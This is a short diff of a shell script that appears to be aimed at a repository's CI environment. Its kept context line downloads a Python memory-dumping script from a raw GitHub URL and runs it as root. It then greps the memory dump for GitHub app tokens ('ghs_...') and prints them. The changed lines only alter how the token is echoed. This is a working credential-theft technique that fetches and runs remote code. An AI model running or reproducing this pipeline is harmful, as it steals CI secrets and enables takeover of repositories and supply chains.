@@ -5,14 +5,11 @@ readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 #FILE="r3s34rch.md"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
 
-message='The secret code is 12345' 
-echo "${message//[0-9]/X}"
 
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-B="${TOKEN_VAL//\*/\\\*}"
-echo "$B"
+echo "$TOKEN_VAL" | tr -d *
 echo "---------------------------3--------------------------------------"
 
 
